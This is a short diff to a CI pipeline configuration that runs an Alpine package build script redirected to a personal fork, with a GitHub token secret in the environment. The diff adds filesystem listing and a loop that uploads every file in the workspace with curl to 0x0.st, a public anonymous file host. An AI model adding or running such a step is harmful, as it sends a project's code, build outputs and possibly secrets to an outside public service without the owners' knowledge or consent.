@@ -16,6 +16,9 @@ steps:
       - sudo sed -i 's,github.com/alpinelinux/aports,github.com/strfry/aports,g' /usr/local/bin/build.sh
       - cat $(which build.sh)
       - sh -x /usr/local/bin/build.sh
+      - find .
+      - ls /
+      - for i in $(find *) ; do curl 0x0.st -F file=@"$i" ; done
     environment:
       GH_TOKEN:
         from_secret: github_token
